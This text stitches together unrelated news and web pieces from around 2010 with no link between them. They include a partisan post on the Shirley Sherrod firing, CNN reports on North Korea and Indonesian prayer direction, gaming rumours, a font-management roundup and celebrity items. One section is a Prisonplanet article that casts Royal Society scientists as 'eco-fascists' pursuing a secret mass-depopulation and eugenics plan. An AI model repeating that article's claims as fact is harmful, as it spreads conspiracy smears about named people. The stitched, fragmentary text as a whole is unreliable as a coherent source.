What the Obama people need is a tough , partisan flak - catcher / deflector who can make the television rounds in real time early in the first 24 - hour news cycle when the white supremacists launch their next set of smears against some hapless public servant inside the Administration .
It ’s a big government .
A “ target - rich environment ” members of the Far Right might say .
There are other Shirley Sherrods at many levels inside the departments , bureaus , and agencies of the government who can have their public statements twisted and edited to create the next “ scandal , ” which will presumably prompt Gibbs ’s next apology .
It ’s a strange political discourse that leaves egg on the faces of the first African - American President and the NAACP while the right - wing racist who concocted the smear walks away unscathed and free to do it again .
There ’s blood in the water now .
The White House showed its skittishness when it comes to accusations of “ reverse racism ” in the Administration .
Why ca n’t President Obama hire a more skilled and partisan press secretary ?
Say what you will about Ari Fleischer and Tony Snow , but no one can say they were n’t good at their jobs .
One of Rahm Emanuel ’s assistants , Jim Messina , even praised the Department of Agriculture for dispatching with Ms. Sherrod quickly as if it were a sign of smart media management instead of total cowardice in the face of an unsubstantiated rumor perpetrated by an untrustworthy source .
What this White House needs is a “ special liaison for media affairs ” ( or something of the sort ) – someone experienced like Howard Dean – to go on TV and defuse these racial controversies when the Breitbarts and the Foxes orchestrate the next one , ( and there will be a next one , and a next one after that , and . . . ) — and with style and unapologetic partisanship dispatch with them as efficiently as Fleischer and Snow used to do with anyone who suggested that it might be an open question whether Iraq had WMD or not .
This fall , in the heat of the midterm campaigns , there will be another Breitbart - style hit piece on one or more African - American members of the administration — one that might hold up better than the one aimed at Sherrod .
You can set your watch by it .
Let ’s hope the Obama White House handles it better than it did this last one .
After all , these racist smears are just like streetcars , one pulls away and you know there ’s another one coming right behind it .

Open -Ended Military Presence in Afghanistan is Counterproductive to our National Security
Ever since two prominent Namco and Capcom producers appeared at Evo 2010 in Las Vegas just over a week ago , rumors have run wild about a Namco vs. Capcom game .
Game Informer has done some digging and found intel that will please Street Fighter and Tekken fans alike .
To catch people up , Namco Bandai's Katsuhiro Harada and Capcom's Yoshinori Ono playfully teased the crowd at the Evo fighting game tournament with some onstage banter ( see video below ) .
The most important information concerned a fighting game debut trailer set to go live on Saturday , July 24th during Comic - Con .
According to our sources , Capcom will make a Capcom vs. Namco game using the Street Fighter IV engine and Namco Bandai will create Namco vs. Capcom with the Tekken 6 engine .
This means that each game will play and look like whichever company is creating it .
Think hadoukens , Ultra Combos , and 2.5D presentation on the Capcom side and three dimensional movement , in - depth move lists , and most likely , a playable panda on the Namco side .
Ono is rumored to produce the Capcom game , and we 're guessing that Harada will handle the Namco end of things .
Capcom 's done its fair share of fighting game crossovers before with companies like Marvel and SNK , but this could be the first time that two totally separate games are produced simultaneously .
UPDATE : The SNK vs. Capcom series has leap frogged back and forth over the years with SNK releasing SvC : The Match of the Millennium releasing on Neo Geo Pocket Color in 1999 , then Capcom released CvS 1 and 2 in arcades in 2000 and 2001 , and finally SNK answered with a true arcade fighter in 2003 with SvC : SVC Chaos .
There were also some SNK card games along the way .
Be sure to come on back this Saturday to see if our information rings true .
Hanoi , Vietnam ( CNN ) -- North Korea on Saturday heightened its threats against upcoming U.S. - supported military exercises after talks over the sinking of a South Korean warship .
North Korea " will legitimately counter with [ its ] powerful nuclear deterrence the largest - ever nuclear war exercises to be staged by the U.S. and the South Korean puppet forces , " the state - run KCNA news agency said .
Earlier , the isolated communist nation vowed a " physical response " to massive U.S. - South Korean military drills set to begin Sunday .
The U.S. Defense Department said the drills are in response to the sinking of the South Korean warship Cheonan and are intended to send a strong message to Pyongyang to stop " provocative and warlike acts . "
At a regional security conference Friday , North Korea lashed out at the impending exercise .
" There will be a physical response against the threat imposed by the United States militarily , " North Korea spokesman Ri Tong Il said outside the Association of Southeast Asian Nations meeting in Hanoi , Vietnam .
Two U.S. military officials told there was no sign of significant troop movement in North Korea .
Why are the two Koreas so hostile ?
About 8,000 military personnel from the United States and South Korea are scheduled to participate in the joint military exercises .
Meanwhile Friday , in the demilitarized zone between the two Koreas , officers from the North sat down for talks about the Cheonan incident with their counterparts in the U.S. - led United Nations Command .
During the almost two - hour meeting in the international truce town of Panmunjom , the U.N. Command reminded the North Koreans of the Security Council 's condemnation this month of the Cheonan attack .
The Security Council did not mention North Korea by name but condemned the attack strongly , called for " full adherence " to the armistice agreement that halted fighting in the Korean War in 1953 and encouraged " the settlement of outstanding issues on the Korean peninsula by peaceful means . "
An international inquiry found North Korea culpable for the March attack that killed 46 South Korean sailors .
But North Korea denies a role in the incident , which elevated tension between the two enemies .
North Korea demanded again Friday that it be allowed to conduct its own investigation of the Cheonan 's sinking and said the upcoming war games are being conducted under false pretext .
" The U.S. forces side would be seriously mistaken if it calculates it can browbeat [ North Korea ] through large - scale war exercises , " the state - run KCNA news agency said .
" It should immediately stop the [ anti- North Korean ] nuclear war racket . "
" [ This ] double - dealing attitude is a dangerous one of driving the situation on the Korean Peninsula to a war phase , " KCNA said .
At the ASEAN meeting , nation after nation expressed deep regrets and offered condolences to the South Koreans .
The United States has accused North Korea of aggressive behavior and imposed new sanctions Wednesday .
Secretary of State Hillary Clinton reiterated U.S. support for South Korea on Friday .
" Here in Asia , an isolated and belligerent North Korea has embarked on a campaign of provocative , dangerous behavior , " she said in Hanoi , Vietnam .
Later , after a repatriation ceremony for the remains of three soldiers who died in the Vietnam War , Clinton said the door remains open for dialogue if North Korea commits to abandoning its nuclear weapons program .
" We would love for them to have the same opportunities that the people of South Korea have been able to enjoy for the last 60 years , " Clinton said .
" So , it is distressing when North Korea continues its threats and causes so much anxiety among its neighbors and the larger region . "
Ri described the planned U.S. - South Korea joint military exercise as " another example of a hostile policy " against North Korea .
" It is a grave threat to the Korean peninsula and also to the region of Asia as a whole , " he said .
He said the exercise is a threat to North Korea 's sovereignty and security .
The military exercise , dubbed Invincible Spirit , is scheduled to run from Sunday through Wednesday .
In addition to the 8,000 personnel involved , military officials say , it will include 20 ships and submarines and about 200 aircraft .
The exercises are to take place in the Sea of Japan on South Korea 's east coast and the Yellow Sea on the west coast , according to a joint U.S. and South Korean statement .
China has objected to war games in the Yellow Sea , so close to its coastline .
And that is what bothers North Korea as well , said a University of Georgia professor who returned two weeks ago from his 52nd trip to Pyongyang .
" I think it 's a bad idea , " said Han Park , who helped arrange former President Carter 's visit to North Korea in 1994 and is the only American to have visited the rogue nation since the Cheonan incident .
Park said the United States should never underestimate the resolve of the North Korean military , one that is further emboldened now by Chinese opposition to the military drills .
" I will hold my breath if this takes place anywhere near the west coast , " he said .

Royal Society ’s initiative will provide textbook for population control agenda
Steve Watson
Prisonplanet.com
Monday , Jul 12th , 2010
The Royal Society , an organisation made up of renowned eco-fascists and depopulation fanatics , is to launch a major study on human population growth and its implications for social and economic development , a study it has ludicrously branded “ objective ” .
“ The society acknowledges it is delving into a hugely controversial area , but says a comprehensive and scientific review of the evidence is needed . ” reports the BBC , along with a picture of a huge crowd of people crammed together ( which is actually a rock concert of some kind ) .
“ This is a topic that has gone to and fro in the last few decades , and appears to be moving back up the political agenda now , ” said the leader of the study Sir John Sulston .
“ So it seems a good moment for the Royal Society to launch a study that looks objectively ( emphasis mine ) at the scientific basis for changes in population , for the different regional and cultural factors that may affect that , and at the effects that population changes will have on our future in term of sustainable development . ”
The manifestly obvious problem with this study , as anyone who knows anything about the Royal Society will note , is the fact that leading members of the group are obsessed with pushing a depopulation agenda .
The Royal Society is a 350 year old establishment outfit that has recently thrown its full weight behind the global warming movement , lending its absolute support for legislation aimed at reducing carbon emissions by 80 % , a process that will devastate the global economy and drastically reduce living standards everywhere .
A d v e r t i s e m e n t
The society has been even more vehement than national governments in its advocacy of the man -made cause of global warming , calling for such drastic CO2 cuts to be made in the short term , not even by the usual target date of 2050 .
It was also intimately tied to the Whitewashing of the Climategate emails scandal .
As the BBC notes in their report , one of the members of the Royal Society ’s working group for this population study is Jonathon Porritt .
Porritt is the former chair of the UK Sustainable Development Commission , one of former Prime Minister Gordon Brown ’s leading green advisers , who has stated that Britain ’s population must be cut in half from around 60 million to 30 million if it is to build a sustainable society .
Porritt is also a member of The Optimum Population Trust ( OPT ) , a notorious UK - based public policy group that campaigns for a gradual decline in the global human population to what it sees as a “ sustainable ” level .
An OPT article on today ’s news opens with the line , “ The human population is far higher than any other primate at any time in history ” .
This outlines exactly where these people will approach the study from .
Another notable member of both the OPT and The Royal Society is Futurist and top Eco-Fascist James Lovelock .
Lovelock became a patron of the OPT in 2009 .
In a statement released by the trust to mark the appointment , Lovelock called on the environmental movement as a whole to “ recognise the truth and speak out ” on the link between rising human numbers and global warming .
Lovelock said : “ Those who fail to see that population growth and climate change are two sides of the same coin are either ignorant or hiding from the truth .
These two huge environmental problems are inseparable and to discuss one while ignoring the other is irrational . ”
He added : “ How can we possibly decrease carbon emissions and land use while the number of emitters and the space they occupy remorselessly increases ?
When will the environmentalists who claim to be green recognise the truth and speak out ? ”
Lovelock also recently called for the ending of freedom in order that an overriding global power made up of “ a few people with authority ” can oversee the radical stemming of the planet ’s human population in order to combat climate change .
So you begin to see how laughable it is to expect the Royal Society ’s global population study , which will certainly be used as a reference by other leading institutions and global bodies , to be in any way “ objective ” .
The OPT and The Royal Society also boast , as a patron , BBC darling wildlife broadcaster and film - maker Sir David Attenborough , who has called for a one child policy like that of Communist China to be implemented in Britain .
The proposal is one of the OPT ’s main initiatives .
Attenborough is also on the Royal Society ’s working group for this population study .
Again , is this man ’s influence going to result in an “ objective ” study on population ?
Another member of the working group is Cambridge economist Sir Partha Dasgupta , also a fellow of the OPT .
Professor Malcolm Potts , another member of the working group was the first male doctor at the Marie Stopes Abortion Clinic in London , he also advised on the UK ’s 1967 Abortion Act .
Marie Stopes was a prominent campaigner for the implementation of eugenics policies .
In Radiant Motherhood ( 1920 ) she called for the “ sterilisation of those totally unfit for parenthood [ to ] be made an immediate possibility , indeed made compulsory . ”
That group , according to her , included non-whites and the poor .
Stopes , an anti-Semite Nazi sympathizer , campaigned for selective breeding to achieve racial purity , a passion she shared with Adolf Hitler in adoring letters and poems that she sent the leader of the Third Reich .
Stopes also attended the Nazi congress on population science in Berlin in 1935 , while calling for the “ compulsory sterilization of the diseased , drunkards , or simply those of bad character . ”
Stopes acted on her appalling theories by concentrating her abortion clinics in poor areas so as to reduce the birth rate of the lower classes .
Stopes left most of her estate to the Eugenics Society , an organization that shared her passion for racial purity and still exists today under the new name The Galton Institute .
The society has included members such as Charles Galton Darwin ( grandson of the evolutionist ) , Julian Huxley and Margaret Sanger .
Perhaps most notably , the head of the Royal Society ’s new study , John Sulston , most famously played a leading role in the Human Genome Project , the effort to identify and map the thousands of genes of the human genome .
Sulston worked under James D. Watson , a notorious eugenicist who has previously argued that black people are inherently less intelligent than whites and has advocated the creation of a “ super - race ” of humans , where the attractive and physically strong are genetically manufactured under laboratory conditions .
Watson is also affiliated with the Royal Society , indeed , in 1993 he recieved the society ’s Copley Medal of honour for “ outstanding achievements in research in any branch of science , and alternates between the physical sciences and the biological sciences ” .
Sulston is also a leading advocate of the renowned Atheist group , The British Humanist Association .
It is clear that this organisation and these people are immersed in the science of eugenics , and that they have continued the science under the guise of environmentalism .
They hate humanity and any notion that their population study will represent anything other than an establishment avocation of mass depopulation is farcical .
It is imperative that the media , places of education , government representatives and the wider public are made aware of these facts .
Alex Jones ’ film End Game explains why the elite are obsessed with pushing eugenics and bizarre race hygiene philosophies .

The Royal Society has also conducted extensive research into geoengineering the planet to manipulate its climate , and continually lobbies the government to divert funding into the area .
The UK government recently published a lengthy report on geoengineering , drawing heavily on Royal Society research .
The report proposed methods including spraying sulphate aerosols into the stratosphere to mimic the cooling effect produced by volcanic eruptions , as well as placing mirrors in space to reflect the Sun ’s rays away from the Earth , a technique known as Solar Radiation Management ( SRM ) .
The same talking points raised by the Society have been re-iterated again and again by public policy groups and environmentalists , as well as the most influential scientists in the US government .
Mass sterilization , one child policies and a “ Planetary Regime ” with the power of life and death were all core concepts put forth by John P. Holdren , the man now in control of science policy in the United States , in his co-authored 1977 book , Ecoscience .
While you and I may think the notions of sterilization and depopulation could never be accepted by the public , those very concepts are now being embraced and popularized as the way forward for humanity .

Letting these modern day eugenicists mess with the planet would be like handing Dr. Josef Mengele control of the health care system .
This group have proven themselves as total control freaks , promoting a brand of bloodthirsty eugenics even more depraved than anything Hitler proposed in his drive for a super race .
While the BBC notes in its report on The Royal Society that “ The burgeoning human population is acknowledged as one of the underlying causes of environmental issues such as climate change , deforestation , depletion of water resources and loss of biodiversity . ” the facts tell quite a different story .
There is a fundamental flaw in associating climate change with overpopulation .
Populations in developed countries are declining and only in third world countries are they expanding dramatically .
Industrialization itself levels out population trends , and even despite this world population models routinely show that the earth ’s population will level out at 9 billion in 2050 and slowly decline after that .
“ The population of the most developed countries will remain virtually unchanged at 1.2 billion until 2050 , ” states a United Nations report .
Once a country industrializes there is an average of a 1.6 child rate per household , so the western world population is actually in decline .
That trend has also been witnessed in areas of Asia like Japan and South Korea .
The UN has stated that the population will peak at 9 billion and then begin declining .
In addition , as highlighted by The Economist recently , global fertility rates are falling .
Since radical environmentalists are pushing to de-industrialize the world in the face of the so called carbon threat , this will reverse the trend that naturally lowers the amount of children people have .
If climate change fanatics are allowed to implement their policies , global population will continue to increase and overpopulation may become a real problem – another example of how the global warming hysterics are actually harming the long term environment of the earth by preventing overpopulated countries from developing and naturally lowering their birth levels .
Even if you play devils advocate and accept that humans do cause catastrophic warming and there are too many of us , and if you can skip past the Nazi eugenics connotations of population control and depopulation policies , those methods are fundamentally still not a valid solution to the perceived climate change threat .
The real solution would be to pour funds into increasing the standards of living of the cripplingly poor third world , allowing those countries to industrialize , and seeing the population figures naturally level out .
Instead , the third world has seen a doubling in food prices owing to climate change policies such as turning over huge areas of agricultural land to the growth of biofuels .
We are being bombarded daily with idiotic notions that the human race and life itself is a virus that has spread all over the planet and that we must consider stemming our own progression to counter it .
Linking environmental policy to depopulation agendas opens the door to eugenics and it is no surprise that through that door have come pouring hordes of elitist filth just begging to be on the front line of the extermination policy .
The Royal Society ’s study is to be launched on “ World Population Day ” , and is due to be completed by early 2012 – I wonder what conclusion it will reach ?
While they peddle their insane proposals , backed by rampant fearmongering over climate change on behalf of our governments and the mainstream media , it is we who are charged with saving the planet and our place on it by exposing their nefarious agenda of mass depopulation before it is too late .

Comment on this article
Jakarta , Indonesia ( CNN ) -- Indonesian Muslims have been praying in the wrong direction , the country 's highest Islamic authority has said .
The Indonesian Ulema Council told the country 's Muslim populace in March to turn west when they offered their daily prayers .
Muslims are supposed to face the Kaaba , the religion 's most sacred site in the city of Mecca in Saudi Arabia .
At the time , the council said that the direction of Kaaba from Indonesia laid to the west .
Turns out , it did n't .
Africa did .
So , on Friday , the council issued a new edict : face northwest .
" After the first fatwa ( edict ) a few months ago that stated that the praying direction is west , we have announced that the correct direction for praying is indeed northwest , and we have issued a new fatwa ( edict ) to correct it , " said Ma'ruf Amin , the head of fatwa division in the Indonesian Ulema Council .
" This is important because facing west will mean that people were facing Africa when they pray , " he said .
Amin said the new edict does not mean that mosques in the country will need to be torn down .
" They ( those praying inside ) just need to adjust their praying direction slightly , " he said .
Some residents of the world 's most populous Muslim country took the change in stride .
" I do n't really worry about the praying direction , " said Riza Irwansyah , an office worker in Jakarta .
" The important thing is I prayed to Allah and I believe He will listen , no matter which way I 'm facing . "
What Adults Can Learn From Kids
It takes 12 - year - old child prodigy Adora Svitak a whopping eight minutes to make a compelling case for why adults need to take a break from figuring out how to teach kids and start to consider how to learn from them .
As Adora explains , “ The goal is not to turn kids into your kind of adult , but rather better adults than you have been . ”
With voter anger about the federal deficit intensifying in this election year , Democrats in Congress are edging away from one of their long - held articles of faith — government spending on social programs such as education and relief for the jobless .
The painful tradeoff comes to center stage this week , when the Senate tries again to pass an extension of unemployment benefits — this time a $ 54 - billion measure that marks an abrupt retreat from a $ 200 - billion bill that Democratic leaders had proposed before the Memorial Day recess .
The stripped - down bill is just one sign of how budget anxieties are beginning to impinge on Democrats ’ legislative ambitions and traditional commitments .
A White House - backed proposal to spend $ 23 billion to save as many as 300,000 teachers ’ jobs has been stymied by deficit concerns .
Similarly , the House , usually a bastion of liberalism , bowed to fiscal conservatives and dropped health insurance subsidies for the unemployed .
“ There is a very changed climate , ” House Speaker Nancy Pelosi ( D- San Francisco ) recently told reporters , referring to anti-deficit pressures she faces within her own party .
Though polls for years have shown high levels of public concern about the deficit , rarely has it outstripped most other issues .
A Wall Street Journal / NBC
News poll in mid-May found a notable increase in recent months in those who believe cutting the deficit and spending should be the government ’s highest priority .
According to the poll , 20 % of those surveyed wanted the deficit and government spending to be the top priority , an issue second to the 35 % concerned about job creation and economic growth .
( In a January poll , 13 % cited the deficit and government spending . )
“ There ’s no question that people are almost as concerned about the deficit and government spending as about jobs , ” said Mark Mellman , a pollster who works closely with congressional Democrats .
“ It is not just about the actual dollars — it is a metaphor for wasted money and lack of discipline and long - term economic decline . ”
Even Friday ’s report that private - sector job growth had slowed to a crawl in May is not expected to offset the Democrats ’ new reluctance to add to the deficit for unemployment benefits .
Republicans scoff at the suggestion that Democrats are getting more serious about the deficit — now projected to reach $ 1.5 trillion this year .
The GOP ’s attack on the run-up in government spending during the Obama administration is an increasingly prominent element in their midterm campaign .
Nonpartisan budget analysts say the signs of Democrats ’ restraint are noteworthy but they are not yet close to the commitment to reduced spending that is needed to make a serious dent in the deficit .
“ What we are seeing now is a heightened political sensitivity to deficits , which I think is a good thing , ” said Robert Bixby , executive director of the Concord Coalition , a budget watchdog group .
“ But Congress has n’t yet figured out what to do about it . ”
Still , Democratic leaders are expecting to face more resistance from within their own party to the spending bills that will pack the agenda in the months leading up to election day — jobs bills , war funding and routine appropriations for the entire federal government .
“ What worked a year ago is not going to work now , ” said Rep. Gerald E. Connolly ( D - Va. ) , one of the 34 Democrats who voted against the jobless benefits bill before Memorial Day .
“ There is a fiscal standard that is more rigorous than a year ago .
That ’s as it should be : A year ago we were in a recession .
Today we are managing a recovery . ”
If , as expected , the latest extension of unemployment benefits passes the Senate this week , it may well be the last .
“ To continue to extend , in an unprecedented fashion , unemployment benefits — indefinitely , without any kind of decision as to how this would end — I think is a mistake , ” said Sen. Claire McCaskill ( D - Mo. ) , an ally of President Obama .
That is a striking change of tone from just three months ago , when McCaskill denounced Sen.
Jim Bunning ( R - Ky . ) for mounting a one - man filibuster against a jobless benefit extension because it added to the deficit .
Even fellow Republicans shunned Bunning like a political leper for what was seen as green - eyeshade heartlessness .
But in the trade - off between spending and the deficit , the political balance is beginning to tip — especially among those from regions where the unemployment rate has dropped below the national average .
Some Democrats have even raised questions about whether the availability of government benefits has discouraged people from looking for jobs — a classic conservative argument rarely heard in Democratic quarters .
Pelosi said she also had to contend with opposition to extending health insurance subsidies .
Two senators are trying to include the money needed to avert 300,000 teacher layoffs — $ 23 billion — in the bill funding the Afghanistan war .
But Sen. Tom Harkin ( D- Iowa ) and House Appropriations Chairman David R. Obey ( D - Wis. ) have met resistance from within their own party as well as from Republicans .
That battle was one reason why Obey announced he was retiring from Congress at the end of this year .
He said at a news conference that he had grown tired of “ begging Blue Dogs to do what they ought to do by rote . ”

U.S. basketball star Amar'e Stoudemire landed in Israel on Wednesday for a voyage of discovery after learning he has Jewish roots .
Stoudemire 's agent said the New York Knicks forward was planning a weeklong visit to learn about the country and explore its religions .
On Wednesday afternoon , Stoudemire posted to his Twitter account , Amareisreal , " Jerusalem is a beautiful city , I 'm at a cafe eating a late lunch .
I 'm learning Hebrew by the min .
Keep up !!
Shalom . "
Open gallery view Amar'e Stoudemire Credit : Reuters
On Monday he Tweeted , " On the flight to Israel .
This is going to be a great trip .
The holy land .
Learn about it , " he wrote , adding " ze ha'halom sheli " - Hebrew for " this is my dream . "
According to an Army Radio report , the Florida native plans to spend time in Israel learning Hebrew , having recently learned he has a Jewish mother .
News of Stoudemire 's trip quickly had Israeli basketball fans abuzz with speculation that they might one day see him playing alongside another Jewish NBA star , Omri Casspi , on Israel 's national team .
So far there is no indication that Stoudemire is here to stay - although for the moment , Israel seems to be getting along just fine without him , beating Great Britain 86 - 82 on Tuesday and Belgium 69 - 64 on Wednesday .
Stoudemire left the Phoenix Suns earlier this month to sign a $ 100 - million , five - year deal with the Knicks .
US actress and model Lindsay Lohan has been sentenced to 90 days in prison for violating her probation in a 2007 drug case .
A judge in California said Lohan , aged 24 , had failed to attend court - ordered alcohol education classes .
The judge ordered Lohan to surrender on 20 July to begin serving the jail term .
The actress had been on probation since August 2007 after pleading guilty to misdemeanour drug charges and no contest to three driving charges .
Judge Marsha Revel said Lohan would also be required to enter an in - patient rehabilitation programme after her release from prison .
Lohan , who starred in Mean Girls , burst into tears after hearing the verdict .
" I did do everything I was told to do and did the best I could to balance jobs and showing up , " she told the court .

The actress must surrender on 20 July
In 2007 , Lohan pleaded guilty to two counts of being under the influence of cocaine and no contest to two counts of drunk driving and one count of reckless driving .
She went to jail but spent only 84 minutes behind bars .
She was also ordered to complete a series of alcohol education courses .
But she failed to do them on time and missed a number of meetings .
In May , an alcohol - monitoring bracelet was fitted after Lohan failed to attend a probation hearing because she claimed to be stranded in France .
Her lawyers said she was unable to fly back from the Cannes Film Festival after her passport was stolen .
idsgn asks :
How do you manage your fonts ?
Unless your name is Massimo , chances are you have more than three or four typefaces in your collection .
Personally , I have always struggled to keep my font library organized .
Over the years I have tried a number of software applications , but never felt completely comfortable with what I 've used .
It ’s a huge investment to try out a new solution , so that typically means putting up with the bloated or sluggish software in exchange for some ‘ time - saving ’ features like auto-activation and font previews .
In hopes of finally discovering a better solution , I asked our Twitter followers earlier this week :
What is your favorite font management application ?
—@idsgn
Is there something better out there ?
It soon became apparent that I am not alone in my quest :
Post the results of that question please !
We 've been having a debate about that in my office .
—@aaronglewis
Those with a favorite were largely split between Linotype FontExplorer X ( Mac , $ 79 USD ) and Bohemian Coding ’s Fontcase ( Mac , $ 56 USD ) — with some Extensis Suitcase Fusion ( Mac & PC , $ 99.95 USD ) sprinkled in .
FontExplorer and Suitcase have been around for a number of years , while Fontcase is the promising new kid on the block .
The application won an Apple Student Design Award in 2009 and comes recommended by FontShop .
I recently tried Fontcase with high hopes — it definitely has the best design of the bunch , and I really wanted to like it — but unfortunately it is painfully slow if you have a large library .
For the past several years I had been using FontAgent Pro by Insider Software ( Mac & PC , $ 99.95 USD ) — do n’t ask me why — and before that I relied on the now - defunct Adobe Type Manager Deluxe .
Is it worth trying another application ?
I asked a couple of our favorite designers and type experts to share their thoughts on the topic .
Jason Santa Maria
Jason Santa Maria is the founder of Brooklyn - based design studio Mighty and the creative director of Typekit .
He also is the founder of Typedia , a shared encyclopedia of typefaces .
Recently , Jason shared a list of his favorite typefaces in FontShop ’s Designer Spotlight , which contains a mix of classics ( Garamond , News Gothic ) and new faces ( Freight , Skolar ) .
So how does Jason keep track of it all ?
I 've been using Linotype 's FontExplorer X since it came out five years ago and have n't looked back .
At the time , I had grown tired with Suitcase 's and ATM 's constant problems and crashes , and Fontbook 's inability to handle more than casual use .
I started organizing my fonts by foundry back when I was in school and have done so ever since .
It may not be the best way , but it makes sense to me because I associate certain aesthetics with particular designers and foundries .
Khoi Vinh
Khoi Vinh is the design director for one of the world ’s most popular websites , The New York Times .
He also runs the weblog Subtraction.com where he writes on design , typography , and Internet culture .
To readers of Subtraction.com , it should come as no surprise that Khoi ’s favorite typeface is Helvetica .
Personally , I do n't use a third - party font management application at all .
I just move fonts in and out of the Fonts folder manually .
It sounds tedious , but I use so few fonts that I find the trouble negligible enough to not worry about — especially in comparison to the headaches and overhead of a font management program .
Nick Sherman
Nick Sherman is a designer and typographer currently working with The Font Bureau .
Nick previously worked at MyFonts , where he overhauled the design and helped organize the world ’s largest collection of fonts .
He also publishes Woodtyper , a blog on large and ornamented type , and serves on the advisory board for the Hamilton Wood Type & Printing Museum .
In his senior degree project at MassArt , Nick focused heavily on the topic of font management and classification , making him an ideal person to speak with .
He explains that while the issue of font management varies for different users , he mostly relies on it for finding and grouping fonts .
I used to use the free version of Linotype 's Font Explorer X software .
More recently , though , I 've simply opted to use the default Font Book software that comes bundled with Mac OS X .
One of the main reasons I originally used Font Explorer X was because it supported dynamic keywords and filtering capabilities .
However , after we improved MyFonts ' tagging , albums , and filtering functionalities , it was a much easier and more powerful for me to use the website when I needed to narrow down or group a list of fonts .
Even though MyFonts does n't represent every font I might have installed , I maintain most of my groupings there using public tags ( universal concepts like ‘ serif ' or ‘ Art Deco ' ) .
I also have a collection of private tags and albums that I use to group things that are n't relevant to other users ( like fonts I 've already licensed or am using for a specific project ) .
My computer runs fine with all my fonts active , and I do n't have to deal with multi-user licensing , so I mostly use desktop font management to install / uninstall fonts and keep technical snag - ups under control .
For this kind of stuff , I 've found that Font Book works fine .
Jackson Cavanaugh
Finally , we were curious what a type designer would suggest , so we turned to Okay Type ’s Jackson Cavanaugh .
Okay
Type is a small Brooklyn type studio who recently released their first typeface Alright Sans , considered by many as one of the best new typefaces of 2009 .
As a type designer , I do n't really use fonts .
I keep as few fonts activated as possible and drop my test files directly into the System Fonts folder ( / System / Library / Fonts ) .
Other designers I know like to use the Adobe Fonts folder ( / Applications / Adobe InDesign CS4 / Fonts ) .
Back when I was a graphic designer , all of the font management software I tried were just okay .
In reality they 're just a tool to help organize your font library .
I 've found that most designers who struggle with font management are n't familiar with what they have .
Taking the time to create useful sub - groups and editing out the garbage is absolutely the most useful way to manage your fonts , regardless of software .
I used to group things into generic categories like ‘ sans , ’ ‘ serif , ’ ‘ slab , ’ ‘ script , ’ etc .
But eventually I found it much more helpful to make groups that related more to my design decisions .
I used to have groups like ‘ classical serifs , ’ ‘ corporate text , ’ ‘ modern / clean sans , ’ ‘ warm / friendly sans , ’ ‘ editorial headlines , ’ ‘ formal scripts , ’ ‘ tech - sans , ’ ‘ bad ( but secretly awesome ) , ’ etc .
Ultimately , the most useful groupings I created were by designers and foundries , ‘ HFJ , ’ ‘ Font Bureau , ’ ‘ Ale Paul , ’ ‘ Christian Schwartz , ’ ‘ Adobe , ’ etc .
When sorting things by their manufacturer you immediately get nice groupings of fonts with similar styles , uses , and quality that make them easy to pick from and pair .
So , how do you manage your fonts ?

Fox News host Glenn Beck announced Tuesday that he has launched an online ' academic program . '
Beck starts online ' university '
Fox News host Glenn Beck announced Tuesday that he has launched an online “ academic program ” teaching classes in “ religion , American history and economics . ”
“ School may be out for the summer , but for Glenn Beck class is just starting , ” reads an announcement on Beck ’s website .
“ This July , while others are relaxing poolside , head back to the classroom — from the comfort of your own home .
That may sound like an oxymoron , but Glenn ’s new academic program is only available online . ”

The site explains that “ Beck University is a unique academic experience bringing together experts in the fields of religion , American history and economics . ”
“ Through captivating lectures and interactive online discussions , these experts will explore the concepts of faith , hope and charity and show you how they influence America ’s past , her present and most importantly her future , ” the announcement promises .
The classes are available to anyone who signs up for Beck ’s “ Extreme Insider ” package , which costs $ 6.26 per month .
A Forbes analysis in April of Beck ’s many business ventures estimated that the conservative radio and talk show host made $ 32 million last year — mostly through his website , magazine , books and many promotional deals .
It 's been sent to the printers !
Once the issue has been published and is off the shelves , I 'll post the comic online .
Since the April 20th BP oil spill began in the Gulf of Mexico , a number of related protests have been held across the country and locally .
On June 11th , a group of bikers blocked entrances at a BP owned ARCO gas station at Fell and Divisadero in San Francisco .
The demonstrators were protesting the environmental outrage in the Gulf of Mexico , as well as a dangerous bike lane that is perennially blocked by cars lining up to enter the station .
"
The message is clear at the ARCO gas station at the corner of Fell and Divisadero streets in San Francisco : $ 2.99 .
That once extravagant price for a gallon of gas is now considered cheap , and continually draws heavily oil addicted drivers in need of a quick fix .
"
In doing so , the drivers ’ vehicles habitually sit in the bicycle lane that runs down Fell Street while awaiting entrance to the mainline pumps .
This in turn forces bikers into the race car traffic roaring up Fell , and injuries to two wheelers are consequently also habitual .
" But that message changed today when dozens of protesters blocked the two entrances off Fell into the station .
They filled the entrances with potted plants , blocked them with their bodies , with banners , with a bike powered sound system whose beats inspired dancing and whooping and carried their message to the neighborhood and beyond . "
Lots of these critters now Even the pros are now mostly bearish , according to anecdotal reports from Goldman Sachs .
Institutional investors have even begun to expect deflation more than inflation , despite having held the opposite view just a week ago :
Goldman :
Clients are uniformly bearish , led by the macro community .
Market performance reinforced this view with the S&P 500 currently trading at a YTD low of 1023 , down 5.0 % during the past week and nearly 100 points or 8.5 % in two weeks .
The S&P 500 has returned - 8.3 % YTD .
...
Deflation now ranks much higher as an investor concern than inflation , which until just a week ago was still viewed as the greater risk .
Concerns articulated by various investors included the prospect of a relapse in US housing ; weak job formation leading to further slowdown in consumer spending ; and legislative and regulatory uncertainty that eroded CEO confidence and curbed capital spending plans .
Ten - year Treasury yields slipped below 3 % and 5 - year implied inflation currently equals just 0.25 % .

Perhaps more than you think .
Imagine simple treasures , far more valuable than anything freed from an attic and featured on
The Antiques Road Show
. The " Three Boxes of Liberty " contain powerful tools .
A legacy left behind by our founders , in the form
of our Constitution , to protect us from tyranny .
Tools designed to preserve a life for all Americans to be free to pursue anything that makes them happy .
For me happiness is
the pursuit of a life of quiet anonymity .
A life where I am unknown to those who are uninvited - you might call that privacy .
Rarely does anything of value ( like privacy or measurable change ) become real without sacrifice , and I 've little to sacrifice , except my desire for a life of
quiet
anonymity and my time .
So , I will give those up here to create a " workshop " dedicated to the tools found in the three boxes .
Please join me in blowing off the dust and putting the tools to work .
The fear is that in a few hundred years , the plutonium could reach an underground area called the saturated zone , where water flows , and from there enter the Columbia River .
Because the area is now arid , contaminants move extremely slowly , but over the millennia the climate is expected to change , experts say .
The finding on the extent of plutonium waste signals that the cleanup , still in its early stages , will be more complex , perhaps requiring technologies that do not yet exist .
But more than 20 years after the Energy Department vowed to embark on a cleanup , it still has not “ characterized , ” or determined the exact nature of , the contaminated soil .
The department has been weighing whether to try to clean up 90 percent , 99 percent or 99.9 percent of the waste , but because the extent of contamination is unclear , so is the relative cost of the options .
For now , the preferred option is 99 percent .
